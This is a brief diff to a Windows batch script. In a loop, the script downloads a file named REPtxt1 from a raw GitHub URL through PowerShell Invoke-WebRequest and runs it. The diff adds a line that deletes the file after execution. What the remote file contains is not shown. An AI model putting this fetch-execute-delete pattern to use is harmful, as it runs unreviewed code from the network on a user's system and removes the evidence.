@@ -2,4 +2,5 @@
 echo downloading and running REPtxt1
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/hub-scripts/master/REPtxt1").Content>REPtxt1
 call REPtxt1
+del REPtxt1
 goto start
